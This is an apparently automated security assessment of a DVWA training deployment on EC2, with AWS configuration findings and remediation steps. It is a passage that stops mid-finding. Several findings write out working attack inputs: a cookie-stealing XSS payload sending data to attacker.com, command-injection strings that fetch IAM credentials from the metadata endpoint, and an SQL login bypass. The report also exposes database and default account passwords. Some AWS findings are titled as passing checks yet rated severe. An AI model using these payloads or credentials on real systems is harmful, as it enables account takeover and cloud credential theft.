# Project Clementine — Security Assessment Report

## Summary

| Severity | Count |
|---|---|
| CRITICAL | 10 |
| HIGH | 62 |
| MEDIUM | 54 |
| LOW | 25 |
| INFO | 3 |

**Attack Chains Identified:** 4

## Attack Chains

### security-cookie-downgrade-unlocks-exploits (CRITICAL)

The application trusts the client-supplied `security` cookie without server-side validation (86557873), so any unauthenticated attacker can set `security=low` (56dfde7c) to disable all input filtering across DVWA modules. With filters removed, the OS command injection in /vulnerabilities/exec/ (80abc11b) becomes trivially reachable, and that RCE is already demonstrated to reach IMDSv1 and steal EC2 role credentials (93a6fcc6). The cookie bypass is therefore the universal precondition that turns every 'security=impossible' hardened endpoint back into an exploitable sink.

### stored-xss-csrf-silent-password-change (HIGH)

An attacker stores JavaScript in the guestbook (2d751fba) that every authenticated viewer — including admins — executes in-session. Because the password-change endpoint has no CSRF token and does not require the current password (54083e51), the stored payload can issue a same-origin request to /vulnerabilities/csrf/ and silently reset the victim's password. The missing HttpOnly flag (d0b5c2fa) and cleartext HTTP (c88a128e) let the payload also exfiltrate PHPSESSID for parallel live hijack. This differs from the existing reflected-XSS+HttpOnly chain because it is persistent and weaponises the CSRF weakness, not cookie theft, for takeover.

### unauth-setup-db-reset-default-creds-revival (HIGH)

setup.php is reachable without authentication (dd22cca1) and exposes a 'Create/Reset Database' action (ff264a65) that wipes the users table and repopulates it with the hard-coded default DVWA accounts (b0fb0876). An attacker who has lost access, or who wants to erase an admin's hardened password, can call setup.php to re-seed admin/password, then authenticate and — because PHPSESSID is not rotated on login (dfd0e072) — pre-set a session ID to fixate the victim admin into the attacker's known session.

### lfi-reads-db-config-then-sqli-pivot (HIGH)

The LFI in /vulnerabilities/fi/ (49be380c) allows arbitrary file read via path traversal, so an unauthenticated attacker can fetch /config/config.inc.php (also independently exposed at a3eebc83) to harvest live MySQL credentials. Combined with the SQLi on /vulnerabilities/sqli/ (66499219) that dumps the users table hashed with unsalted MD5 (946a1ddf), the attacker obtains both direct DB-level access and cleartext application passwords — enabling full data exfiltration and lateral login as any user, including admin.

## Findings

### [CRITICAL] Database Credentials Exposed via Backup Config File (config.inc.php.bak)
- **Category:** WSTG-CONF-03
- **Resource:** http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/config/config.inc.php.bak

The file /config/config.inc.php.bak is publicly accessible via HTTP and contains the full PHP source code of the application's database configuration, including plaintext database credentials. The file reveals: database server (127.0.0.1), database name (dvwa), database username (app), and database password (vulnerables). The file is served as application/x-trash (a backup extension) rather than being blocked or restricted. This allows any unauthenticated attacker to retrieve the database credentials and potentially access the database directly (port 3306 is currently filtered but this could change) or use these credentials for further attacks.

**Remediation:** 1. Immediately delete the backup file /config/config.inc.php.bak from the web server. 2. Rotate the exposed database credentials (change password for the 'app' database user). 3. Configure Apache to deny access to .bak, .old, .tmp, .swp and other backup file extensions using a Deny directive or FilesMatch rule in httpd.conf or .htaccess. 4. Move configuration files containing credentials outside the web root. 5. Implement a pre-deployment checklist that removes all backup/temp files before going live.

### [CRITICAL] Attached AWS-managed IAM policy does not allow '*:*' administrative privileges
- **Category:** iam_aws_attached_policy_no_administrative_privileges
- **Resource:** arn:aws:iam::aws:policy/AdministratorAccess

**IAM AWS-managed policies** attached to identities are inspected for statements that allow `Action:'*'` on `Resource:'*'`-i.e., full administrative `*:*` permissions

**Remediation:** Apply **least privilege**: avoid attaching AWS-managed policies that grant `*:*`.
- Use **customer-managed, scoped policies** per role
- Enforce **separation of duties** and **permissions boundaries**
- Prefer **temporary, time-bound elevation** for emergencies with MFA
- Regularly review access and use conditions to constrain context

### [CRITICAL] Root account has no active access keys
- **Category:** iam_no_root_access_key
- **Resource:** arn:aws:iam::760689105616:root

**AWS root user** is evaluated for **active access keys**. It identifies whether the root identity has one or two programmatic credentials and notes when organization-level root credential management is present.

**Remediation:** Delete and prohibit **root access keys**. Use **IAM roles** and temporary credentials with **least privilege** for all automation. Enable **MFA on root**, limit root to break-glass use, and continuously monitor for any new root keys. *Where applicable*, apply organization-wide controls to enforce this.

### [CRITICAL] SQL Injection — UNION-Based Data Extraction in /vulnerabilities/sqli/ (id parameter)
- **Category:** WSTG-INPV-05
- **Resource:** http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/vulnerabilities/sqli/

The `id` parameter in GET /vulnerabilities/sqli/ is vulnerable to UNION-based SQL injection. The parameter is interpolated directly into a SQL query without sanitisation. An attacker can inject a UNION SELECT clause to exfiltrate arbitrary data from any table in the database. Full credential dump of the `users` table was achieved, including usernames and MD5-hashed passwords for all 5 application accounts. Database fingerprinting revealed MariaDB 10.1.26 running the `dvwa` schema.

Confirmed injection points and results:
- `@@version` → 10.1.26-MariaDB-0+deb9u1
- `database()` → dvwa
- `SELECT user,password FROM users` → 5 accounts (admin, gordonb, 1337, pablo, smithy) with MD5 hashes

**Remediation:** 1. Use parameterised queries (prepared statements) for all database interactions — never interpolate user input into SQL strings. 2. Apply least-privilege database accounts — the web app account should not be able to SELECT from arbitrary tables. 3. Hash passwords with bcrypt/Argon2 (the MD5 hashes are trivially crackable). 4. Implement a WAF as a defence-in-depth layer.

### [CRITICAL] SQL Injection — Boolean Blind Data Extraction in /vulnerabilities/sqli_blind/ (id parameter)
- **Category:** WSTG-INPV-05
- **Resource:** http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/vulnerabilities/sqli_blind/

The `id` parameter in GET /vulnerabilities/sqli_blind/ is vulnerable to boolean-based blind SQL injection. The application returns a binary oracle ("User ID exists" vs "User ID is MISSING") based on the truth of injected conditions, enabling bit-by-bit extraction of any database value. Exploitation confirmed database name as `dvwa` (length=4, first char='d') using substring() inference. A full automated exploitation with sqlmap/custom tooling would yield identical data to the error-based endpoint.

**Remediation:** 1. Use parameterised queries (prepared statements) — same root cause as FINDING-035. 2. The boolean oracle response difference should be eliminated (return the same error for all invalid input). 3. Implement query result caching or timing normalisation to prevent time-based variants.

### [CRITICAL] OS Command Injection — Arbitrary Command Execution via ip parameter in /vulnerabilities/exec/
- **Category:** WSTG-INPV-12
- **Resource:** http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/vulnerabilities/exec/

The `ip` POST parameter in /vulnerabilities/exec/ is passed unsanitised to a shell command (likely `ping`). An attacker can append arbitrary OS commands using standard shell separators (`;`, `|`, `&&`). Exploitation confirmed execution as `www-data` (uid=33) on a Linux x86_64 host running Amazon Linux 2023. Arbitrary file read was demonstrated by exfiltrating /etc/passwd. The server is a Docker container (hostname `1360b4239a47`) on an EC2 instance. This represents full OS-level Remote Code Execution.

**Remediation:** 1. NEVER pass user input to shell functions (exec, shell_exec, system, passthru, popen). 2. Use language-native libraries for network operations (e.g., PHP's socket functions or ICMP libraries instead of calling `ping`). 3. If shell execution is unavoidable, use escapeshellarg() to sanitise input AND whitelist valid IP address patterns via regex before passing to the shell. 4. Apply OS-level restrictions: run the web process as a low-privilege user (already www-data) in a read-only filesystem with restricted system call access (seccomp/AppArmor).

### [CRITICAL] Vulnerability Chain: XSS + Missing HttpOnly Cookie = Authenticated Session Hijacking
- **Category:** WSTG-INPV-01
- **Resource:** http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/vulnerabilities/xss_r/

Three confirmed XSS vulnerabilities (FINDING-030 reflected, FINDING-031 stored, FINDING-032 DOM) chain with the missing HttpOnly flag on the PHPSESSID session cookie (FINDING-004) to enable complete authenticated session hijacking. Because PHPSESSID lacks the HttpOnly attribute, JavaScript executed via any of the three XSS vectors can access document.cookie and exfiltrate the session token.

Chain: XSS (reflected/stored/DOM) → document.cookie accessible → PHPSESSID stolen → session replayed by attacker → full account takeover.

Exploitation steps:
1. An attacker induces a victim to click a reflected XSS link or visit a page that loads the stored payload.
2. The payload executes: <script>document.location='http://attacker.com/?c='+document.cookie</script>
3. The attacker receives the victim's PHPSESSID in their server log.
4. The attacker replays the cookie in a browser and is authenticated as the victim.

This chain has been demonstrated: the cookie theft payload <script>document.write(document.cookie)</script> was confirmed to reflect the PHPSESSID value in the response (FINDING-030 evidence). The PHPSESSID is readable by JavaScript because HttpOnly is absent (FINDING-004).

Severity upgraded from High to Critical because the combination enables complete authentication bypass with no further prerequisites. Individual XSS severities are High; chaining with missing HttpOnly makes session hijacking trivially achievable.

**Remediation:** 1. Set HttpOnly flag on PHPSESSID: session.cookie_httponly = 1 in php.ini (blocks JS access)
2. Sanitize all user-supplied input before HTML output (fixes XSS root cause)
3. Implement Content-Security-Policy to restrict script execution
4. These three remediations must be applied together; fixing only one leaves the chain partially exploitable.

### [CRITICAL] Vulnerability Chain: OS Command Injection → AWS IMDSv1 Credential Theft
- **Category:** WSTG-INPV-12
- **Resource:** http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/vulnerabilities/exec/

The confirmed OS Command Injection vulnerability at /vulnerabilities/exec/ (FINDING-037, running as www-data) chains with the AWS EC2 IMDSv1 instance metadata service (FINDING-011) to enable AWS credential theft. Since IMDSv1 does not require a session token and is accessible from within the EC2 instance, the www-data process can make HTTP requests to the link-local metadata endpoint (169.254.169.254) and retrieve IAM role credentials.

Chain: RCE as www-data → curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ → retrieve IAM role name → curl http://169.254.169.254/.../RoleName → extract AccessKeyId, SecretAccessKey, Token → AWS API access.

Exploitation steps:
1. Execute: ip=127.0.0.1;curl+http://169.254.169.254/latest/meta-data/iam/security-credentials/
2. This returns the IAM role name attached to the instance.
3. Execute: ip=127.0.0.1;curl+http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
4. Returns temporary AWS credentials (AccessKeyId, SecretAccessKey, Token).
5. Attacker uses credentials to access S3 buckets, EC2 APIs, and other AWS services.

Note: The testing tool container could not reach 169.254.169.254 (link-local, external only), but the EC2 instance itself can. The www-data user obtained via CMDi runs within the EC2 instance and DOES have access to the metadata endpoint.

**Remediation:** 1. Fix the OS Command Injection vulnerability (sanitize ip parameter input, use parameterized system calls)
2. Enable IMDSv2 on the EC2 instance (requires session token, prevents SSRF-based IMDS access)
3. Restrict the IAM role attached to this instance to minimum required permissions
4. These remediations must be applied together; the RCE is the primary vector requiring immediate remediation.

### [CRITICAL] Unrestricted File Upload - PHP Webshell Upload and Remote Code Execution
- **Category:** WSTG-BUSL-08
- **Resource:** http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/vulnerabilities/upload/

The file upload functionality at /vulnerabilities/upload/ does not validate the uploaded file type, extension, or content. A PHP webshell was successfully uploaded and executed, achieving Remote Code Execution (RCE) on the server as the www-data user running on a Linux 6.18.20 (Amazon Linux 2023) kernel. This is a separate exploitation vector from the OS command injection finding (FINDING-037) as it uses the file upload mechanism rather than the exec vulnerability. The application accepts PHP files regardless of the MIME type or extension, allows them to be stored in a web-accessible directory (/hackable/uploads/), and the web server executes them as PHP code. Note: allow_url_include is Off, so PHP remote file inclusion via the LFI endpoint is not possible - however RCE via file upload is fully confirmed. System info from shell execution: Linux hostname running kernel 6.18.20-20.229.amzn2023.x86_64 (Amazon Linux 2023).

**Remediation:** 1. Implement strict server-side file type validation using file content inspection (magic bytes), not just MIME type or extension. 2. Generate a random filename for uploaded files and store the mapping server-side. 3. Store uploaded files outside the web root or in a directory with PHP execution disabled (php_flag engine off in .htaccess). 4. Implement a whitelist of allowed file types (e.g., only .jpg, .png, .gif). 5. Validate file content matches the declared MIME type. 6. Remove execute permissions from the uploads directory.

### [CRITICAL] SQL Injection Authentication Bypass at /vulnerabilities/brute/ Login Form
- **Category:** WSTG-INPV-05
- **Resource:** http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/vulnerabilities/brute/

The brute-force challenge module at /vulnerabilities/brute/ is vulnerable to SQL injection in the `username` GET parameter, enabling complete authentication bypass without knowing any valid password. By injecting a SQL comment sequence, the password-checking clause is eliminated from the underlying query.

Underlying query (inferred): SELECT * FROM users WHERE username='$username' AND password=md5('$password')

Injection: username = `admin'-- -` → query becomes: SELECT * FROM users WHERE username='admin'-- -'... (password check commented out)

The server returns "Welcome to the password protected area admin'-- -" and loads the admin's profile image (/hackable/users/admin.jpg), confirming successful authentication as admin with an incorrect password.

This is distinct from the SQLi data extraction vulnerability at /vulnerabilities/sqli/ (FINDING-035). This finding demonstrates that SQL injection in authentication contexts enables complete account takeover without needing the password — the most severe class of SQL injection impact.

**Remediation:** 1. Use parameterized queries / prepared statements for all authentication queries (eliminates SQL injection)
2. Apply input validation to reject special characters in usernames
3. Hash passwords server-side before SQL comparison (already partially implemented but bypassed by injection)
4. Implement account lockout after failed attempts to slow brute-force and injection testing

### [HIGH] No HTTPS - All Traffic Transmitted in Cleartext
- **Category:** WSTG-CONF-07
- **Resource:** http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/

The application does not support HTTPS (port 443 is filtered). All application traffic including login credentials, session cookies, and sensitive data is transmitted in plaintext over HTTP. This exposes all user data to network-level eavesdropping and man-in-the-middle attacks. Verified via nmap: port 443 is filtered, port 80 is open running Apache.

**Remediation:** Implement TLS/SSL on port 443, redirect all HTTP traffic to HTTPS using a 301 redirect, and configure HTTP Strict Transport Security (HSTS) with a minimum 1-year max-age. Use a valid TLS certificate from a trusted CA.

### [HIGH] Session Cookie Missing HttpOnly Flag
- **Category:** WSTG-SESS-02
- **Resource:** http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/login.php

The PHPSESSID session cookie is set without the HttpOnly flag. This allows client-side JavaScript to access the session cookie via document.cookie, enabling session token theft via Cross-Site Scripting (XSS) attacks. An attacker exploiting an XSS vulnerability could steal the session cookie and hijack authenticated sessions.

**Remediation:** Set HttpOnly flag on all session cookies (session.cookie_httponly = 1 in php.ini). Also set the Secure flag once HTTPS is implemented (FINDING-003). CHAINING NOTE: This finding chains with FINDING-003 (No HTTPS): without HTTPS, the PHPSESSID session cookie is visible to any network observer; without HttpOnly, it is also accessible to client-side JavaScript via XSS. Together these create a dual session-theft attack surface — fix both to break the chain. Priority: Implement HTTPS (FINDING-003) first, then enforce Secure+HttpOnly cookie flags.

### [HIGH] Application Configuration File Publicly Accessible (/config/config.inc.php)
- **Category:** WSTG-CONF-04
- **Resource:** http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/config/config.inc.php

The file /config/config.inc.php is publicly accessible over HTTP without authentication (HTTP 200). The file contains repeated AWS credential placeholder comments (# aws_access_key_id = AKIA&lt;YOUR_KEY_ID_HERE&gt; / # aws_secret_access_key = &lt;YOUR_SECRET_HERE&gt;) and an EOFaws heredoc terminator, indicating this file is the designated location for real AWS credentials in deployment. While the current deployment uses placeholders, the file is entirely unprotected by Apache access controls, meaning any real credentials placed here would be immediately exfiltrated. Additionally, .gitignore (HTTP 200) is publicly accessible and reveals internal path structure. Cross-referenced with WSTG-CONF-04 and WSTG-CONF-09 (consolidated finding — same root cause and URL).

**Remediation:** 1. Deny HTTP access to /config/ directory via Apache .htaccess or server config: Deny from all. 2. Remove /config/config.inc.php from the web root entirely — config files should not be in the document root. 3. Remove .gitignore from the web root. 4. Audit all files in the document root for inadvertent information disclosure. 5. Ensure real AWS credentials are never placed in web-accessible files; use IAM instance roles or AWS Secrets Manager instead.

### [HIGH] Unauthenticated Access to Administrative Setup Page (setup.php)
- **Category:** WSTG-ATHZ-02
- **Resource:** http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/setup.php

The DVWA setup page (setup.php) is accessible without authentication. This page exposes sensitive server configuration details including: PHP version (7.0.30-0+deb9u1), database backend (MySQL), database name (dvwa), database host (127.0.0.1), database username (app), operating system (*nix), and web server hostname. The page also reveals whether URL inclusion is enabled and provides a "Create / Reset Database" button that would allow an unauthenticated attacker to reset the entire application database including admin credentials. The authorization check that protects all other DVWA pages does not apply to setup.php. Additionally, about.php and instructions.php are accessible without authentication, though these expose lower-risk information.

**Remediation:** Enforce authentication checks on setup.php consistent with all other authenticated pages. Move setup functionality behind admin-level access controls. Consider removing or disabling setup.php entirely in production deployments. The page should check for a valid authenticated session before rendering any content or accepting POST requests.

### [HIGH] Security Level Bypass via Client-Controlled Cookie (security=low)
- **Category:** WSTG-ATHZ-03
- **Resource:** http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/security.php

DVWA's security level (low/medium/high/impossible) is stored in a client-controlled cookie named "security" rather than server-side session state. Any authenticated user can freely modify this cookie value to change the application's security posture without server-side validation. This means:
1. An admin who sets security=high (intending to restrict exploitation) can have their setting overridden by any authenticated user simply setting security=low in their browser.
2. The security cookie is trusted entirely client-side — the server applies whichever level the client presents.

Proof: With the same valid session (PHPSESSID), changing the security cookie from "low" to "high" changes which SQL injection code path executes. Setting it back to "low" immediately re-enables the vulnerable code path, confirming the server applies no independent server-side security level per session.

This means all security hardening intended by the administrator can be trivially bypassed by any authenticated user, rendering the "high" and "impossible" security levels ineffective as access controls.

**Remediation:** Store the security level in server-side session state rather than a client-controlled cookie. The security level should be set once by an administrator and stored in the PHP session ($_SESSION['security']), not read from $_COOKIE['security'] on each request. Users should not be able to influence their own security level.

### [HIGH] Session Fixation - PHPSESSID Not Rotated After Authentication
- **Category:** WSTG-SESS-03
- **Resource:** http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/login.php

DVWA does not issue a new session identifier upon successful user authentication. The PHPSESSID assigned before login remains unchanged after the user authenticates, enabling session fixation attacks. An attacker who can fix a victim's session token (e.g., via a URL parameter if trans_sid were enabled, or via subdomain cookie injection) would be able to hijack the authenticated session without knowing the victim's credentials.

Evidence: Pre-login PHPSESSID `0hd80hcaic4514t1kcbm1q32f2` remained identical post-login (cookie jar comparison). The server issued a 302 redirect to index.php on successful login but did NOT issue a new Set-Cookie: PHPSESSID header, confirming the session ID was reused.

**Remediation:** Call session_regenerate_id(true) immediately after successful authentication in login.php. The 'true' parameter deletes the old session file. Example: if (valid_credentials) { session_regenerate_id(true); $_SESSION['user'] = $username; }

### [HIGH] Multiple Default/Weak Credentials Active on All DVWA User Accounts
- **Category:** WSTG-ATHN-02
- **Resource:** http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/login.php

All five DVWA user accounts use well-known default or trivially weak passwords that are publicly documented. All credentials were verified as valid: gordonb/abc123, 1337/charley, pablo/letmein, smithy/password (admin password also confirmed working). These credentials are the factory defaults for DVWA and are known to any attacker familiar with the platform. The admin account username is "Admin" (capital A) while the login form is case-sensitive.

**Remediation:** Change all default passwords to strong, unique passwords. Implement a password policy enforcing minimum length (12+ chars), complexity, and preventing use of well-known default passwords. Disable or remove demo/test accounts not needed in production.

### [HIGH] Cross-Site Request Forgery (CSRF) on Password Change Endpoint
- **Category:** WSTG-SESS-05
- **Resource:** http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/vulnerabilities/csrf/

The password change functionality at /vulnerabilities/csrf/ accepts GET requests with no CSRF token validation. An authenticated user can have their password changed by visiting a malicious link or loading a page containing a crafted URL. No CSRF token, Referer check, or any anti-forgery mechanism is present. Additionally, the form does not require the current/old password before accepting a new one, making account takeover trivial — an attacker with a valid session (e.g., via session hijacking or XSS) can change the password without knowing the original. Password change was confirmed successful via direct unauthenticated GET request with only session cookie. This vulnerability was also confirmed under WSTG-ATHN-09.

**Remediation:** 1. Switch the form method from GET to POST to prevent URL-based attacks. 2. Implement synchronizer token pattern: generate a per-session CSRF token, embed it in the form as a hidden field, validate it server-side on every state-changing request. 3. Consider adding SameSite=Strict to session cookies to block cross-site requests. 4. Require the current password to be entered when changing the password (defense-in-depth).

### [HIGH] Password Change Function Has No CSRF Protection and No Current Password Verification
- **Category:** WSTG-ATHN-09
- **Resource:** http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/vulnerabilities/csrf/

The password change functionality at /vulnerabilities/csrf/ uses the HTTP GET method and requires no CSRF token. An authenticated user's password can be changed by any webpage they visit while logged in — a classic CSRF attack. Additionally, the form does not require the user's current password to be entered before setting a new one, making account takeover trivial once CSRF is exploited. The change was confirmed successful via direct GET request with only the new password parameters.

**Remediation:** 1. Change password change functionality to use POST method. 2. Implement a synchronizer CSRF token on the form. 3. Require the user's current password before accepting a new password. 4. Implement SameSite=Strict or SameSite=Lax on session cookies. Note: This is an intentional vulnerability in DVWA for training purposes.

### [HIGH] Backup Configuration File Exposes Database Credentials
- **Category:** WSTG-CONF-04
- **Resource:** http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/config/config.inc.php.bak

The file /config/config.inc.php.bak is publicly accessible without authentication and contains plaintext database credentials: db_user='app', db_password='vulnerables', db_database='dvwa', db_server='127.0.0.1'. The /config/ directory also has Apache directory listing enabled, revealing all files in the directory including config.inc.php, config.inc.php.bak, and config.inc.php.dist.

**Remediation:** 1. Remove or restrict access to backup configuration files (.bak, .dist). 2. Disable Apache directory listing (Options -Indexes). 3. Move config directory outside web root or protect with .htaccess. 4. Rotate the exposed database credentials immediately.

### [HIGH] Region has at least one CloudTrail trail logging
- **Category:** cloudtrail_multi_region_enabled
- **Resource:** arn:aws:cloudtrail:ap-northeast-1:760689105616:trail

**AWS CloudTrail** has at least one trail with `logging` enabled in every region. A **multi-region trail** or a regional trail counts for coverage in that region.

**Remediation:** Use a **multi-region CloudTrail trail** or per-region trails so `logging` is active in every region, including unused ones.

Centralize logs, enforce **least privilege** to log stores, and add **defense-in-depth** with encryption, integrity validation, and retention. Continuously monitor trail health to catch gaps.

### [HIGH] Region has at least one CloudTrail trail logging
- **Category:** cloudtrail_multi_region_enabled
- **Resource:** arn:aws:cloudtrail:ap-northeast-2:760689105616:trail

**AWS CloudTrail** has at least one trail with `logging` enabled in every region. A **multi-region trail** or a regional trail counts for coverage in that region.

**Remediation:** Use a **multi-region CloudTrail trail** or per-region trails so `logging` is active in every region, including unused ones.

Centralize logs, enforce **least privilege** to log stores, and add **defense-in-depth** with encryption, integrity validation, and retention. Continuously monitor trail health to catch gaps.

### [HIGH] Region has at least one CloudTrail trail logging
- **Category:** cloudtrail_multi_region_enabled
- **Resource:** arn:aws:cloudtrail:ap-northeast-3:760689105616:trail

**AWS CloudTrail** has at least one trail with `logging` enabled in every region. A **multi-region trail** or a regional trail counts for coverage in that region.

**Remediation:** Use a **multi-region CloudTrail trail** or per-region trails so `logging` is active in every region, including unused ones.

Centralize logs, enforce **least privilege** to log stores, and add **defense-in-depth** with encryption, integrity validation, and retention. Continuously monitor trail health to catch gaps.

### [HIGH] Region has at least one CloudTrail trail logging
- **Category:** cloudtrail_multi_region_enabled
- **Resource:** arn:aws:cloudtrail:ap-south-1:760689105616:trail

**AWS CloudTrail** has at least one trail with `logging` enabled in every region. A **multi-region trail** or a regional trail counts for coverage in that region.

**Remediation:** Use a **multi-region CloudTrail trail** or per-region trails so `logging` is active in every region, including unused ones.

Centralize logs, enforce **least privilege** to log stores, and add **defense-in-depth** with encryption, integrity validation, and retention. Continuously monitor trail health to catch gaps.

### [HIGH] Region has at least one CloudTrail trail logging
- **Category:** cloudtrail_multi_region_enabled
- **Resource:** arn:aws:cloudtrail:ap-southeast-1:760689105616:trail

**AWS CloudTrail** has at least one trail with `logging` enabled in every region. A **multi-region trail** or a regional trail counts for coverage in that region.

**Remediation:** Use a **multi-region CloudTrail trail** or per-region trails so `logging` is active in every region, including unused ones.

Centralize logs, enforce **least privilege** to log stores, and add **defense-in-depth** with encryption, integrity validation, and retention. Continuously monitor trail health to catch gaps.

### [HIGH] Region has at least one CloudTrail trail logging
- **Category:** cloudtrail_multi_region_enabled
- **Resource:** arn:aws:cloudtrail:ap-southeast-2:760689105616:trail

**AWS CloudTrail** has at least one trail with `logging` enabled in every region. A **multi-region trail** or a regional trail counts for coverage in that region.

**Remediation:** Use a **multi-region CloudTrail trail** or per-region trails so `logging` is active in every region, including unused ones.

Centralize logs, enforce **least privilege** to log stores, and add **defense-in-depth** with encryption, integrity validation, and retention. Continuously monitor trail health to catch gaps.

### [HIGH] Region has at least one CloudTrail trail logging
- **Category:** cloudtrail_multi_region_enabled
- **Resource:** arn:aws:cloudtrail:ca-central-1:760689105616:trail

**AWS CloudTrail** has at least one trail with `logging` enabled in every region. A **multi-region trail** or a regional trail counts for coverage in that region.

**Remediation:** Use a **multi-region CloudTrail trail** or per-region trails so `logging` is active in every region, including unused ones.

Centralize logs, enforce **least privilege** to log stores, and add **defense-in-depth** with encryption, integrity validation, and retention. Continuously monitor trail health to catch gaps.

### [HIGH] Region has at least one CloudTrail trail logging
- **Category:** cloudtrail_multi_region_enabled
- **Resource:** arn:aws:cloudtrail:eu-central-1:760689105616:trail

**AWS CloudTrail** has at least one trail with `logging` enabled in every region. A **multi-region trail** or a regional trail counts for coverage in that region.

**Remediation:** Use a **multi-region CloudTrail trail** or per-region trails so `logging` is active in every region, including unused ones.

Centralize logs, enforce **least privilege** to log stores, and add **defense-in-depth** with encryption, integrity validation, and retention. Continuously monitor trail health to catch gaps.

### [HIGH] Region has at least one CloudTrail trail logging
- **Category:** cloudtrail_multi_region_enabled
- **Resource:** arn:aws:cloudtrail:eu-north-1:760689105616:trail

**AWS CloudTrail** has at least one trail with `logging` enabled in every region. A **multi-region trail** or a regional trail counts for coverage in that region.

**Remediation:** Use a **multi-region CloudTrail trail** or per-region trails so `logging` is active in every region, including unused ones.

Centralize logs, enforce **least privilege** to log stores, and add **defense-in-depth** with encryption, integrity validation, and retention. Continuously monitor trail health to catch gaps.

### [HIGH] Region has at least one CloudTrail trail logging
- **Category:** cloudtrail_multi_region_enabled
- **Resource:** arn:aws:cloudtrail:eu-west-1:760689105616:trail

**AWS CloudTrail** has at least one trail with `logging` enabled in every region. A **multi-region trail** or a regional trail counts for coverage in that region.

**Remediation:** Use a **multi-region CloudTrail trail** or per-region trails so `logging` is active in every region, including unused ones.

Centralize logs, enforce **least privilege** to log stores, and add **defense-in-depth** with encryption, integrity validation, and retention. Continuously monitor trail health to catch gaps.

### [HIGH] Region has at least one CloudTrail trail logging
- **Category:** cloudtrail_multi_region_enabled
- **Resource:** arn:aws:cloudtrail:eu-west-2:760689105616:trail

**AWS CloudTrail** has at least one trail with `logging` enabled in every region. A **multi-region trail** or a regional trail counts for coverage in that region.

**Remediation:** Use a **multi-region CloudTrail trail** or per-region trails so `logging` is active in every region, including unused ones.

Centralize logs, enforce **least privilege** to log stores, and add **defense-in-depth** with encryption, integrity validation, and retention. Continuously monitor trail health to catch gaps.

### [HIGH] Region has at least one CloudTrail trail logging
- **Category:** cloudtrail_multi_region_enabled
- **Resource:** arn:aws:cloudtrail:eu-west-3:760689105616:trail

**AWS CloudTrail** has at least one trail with `logging` enabled in every region. A **multi-region trail** or a regional trail counts for coverage in that region.

**Remediation:** Use a **multi-region CloudTrail trail** or per-region trails so `logging` is active in every region, including unused ones.

Centralize logs, enforce **least privilege** to log stores, and add **defense-in-depth** with encryption, integrity validation, and retention. Continuously monitor trail health to catch gaps.

### [HIGH] Region has at least one CloudTrail trail logging
- **Category:** cloudtrail_multi_region_enabled
- **Resource:** arn:aws:cloudtrail:sa-east-1:760689105616:trail

**AWS CloudTrail** has at least one trail with `logging` enabled in every region. A **multi-region trail** or a regional trail counts for coverage in that region.

**Remediation:** Use a **multi-region CloudTrail trail** or per-region trails so `logging` is active in every region, including unused ones.

Centralize logs, enforce **least privilege** to log stores, and add **defense-in-depth** with encryption, integrity validation, and retention. Continuously monitor trail health to catch gaps.

### [HIGH] Region has at least one CloudTrail trail logging
- **Category:** cloudtrail_multi_region_enabled
- **Resource:** arn:aws:cloudtrail:us-east-1:760689105616:trail

**AWS CloudTrail** has at least one trail with `logging` enabled in every region. A **multi-region trail** or a regional trail counts for coverage in that region.

**Remediation:** Use a **multi-region CloudTrail trail** or per-region trails so `logging` is active in every region, including unused ones.

Centralize logs, enforce **least privilege** to log stores, and add **defense-in-depth** with encryption, integrity validation, and retention. Continuously monitor trail health to catch gaps.

### [HIGH] Region has at least one CloudTrail trail logging
- **Category:** cloudtrail_multi_region_enabled
- **Resource:** arn:aws:cloudtrail:us-east-2:760689105616:trail

**AWS CloudTrail** has at least one trail with `logging` enabled in every region. A **multi-region trail** or a regional trail counts for coverage in that region.

**Remediation:** Use a **multi-region CloudTrail trail** or per-region trails so `logging` is active in every region, including unused ones.

Centralize logs, enforce **least privilege** to log stores, and add **defense-in-depth** with encryption, integrity validation, and retention. Continuously monitor trail health to catch gaps.

### [HIGH] Region has at least one CloudTrail trail logging
- **Category:** cloudtrail_multi_region_enabled
- **Resource:** arn:aws:cloudtrail:us-west-1:760689105616:trail

**AWS CloudTrail** has at least one trail with `logging` enabled in every region. A **multi-region trail** or a regional trail counts for coverage in that region.

**Remediation:** Use a **multi-region CloudTrail trail** or per-region trails so `logging` is active in every region, including unused ones.

Centralize logs, enforce **least privilege** to log stores, and add **defense-in-depth** with encryption, integrity validation, and retention. Continuously monitor trail health to catch gaps.

### [HIGH] Region has at least one CloudTrail trail logging
- **Category:** cloudtrail_multi_region_enabled
- **Resource:** arn:aws:cloudtrail:us-west-2:760689105616:trail

**AWS CloudTrail** has at least one trail with `logging` enabled in every region. A **multi-region trail** or a regional trail counts for coverage in that region.

**Remediation:** Use a **multi-region CloudTrail trail** or per-region trails so `logging` is active in every region, including unused ones.

Centralize logs, enforce **least privilege** to log stores, and add **defense-in-depth** with encryption, integrity validation, and retention. Continuously monitor trail health to catch gaps.

### [HIGH] EBS volume is encrypted
- **Category:** ec2_ebs_volume_encryption
- **Resource:** arn:aws:ec2:us-east-1:760689105616:volume/vol-0dd3edf557765d016

**EBS volumes** are assessed for **encryption at rest** using **AWS KMS**.

The finding identifies volumes whose `encrypted` state is disabled, meaning data is stored unencrypted on block storage.

**Remediation:** Encrypt all EBS volumes and enable `encryption by default` for new volumes and snapshot copies.

Apply **least privilege** to KMS keys, restrict snapshot sharing, and enforce **defense in depth** with policies and templates that prevent creation of unencrypted storage.

### [HIGH] EBS volume is encrypted
- **Category:** ec2_ebs_volume_encryption
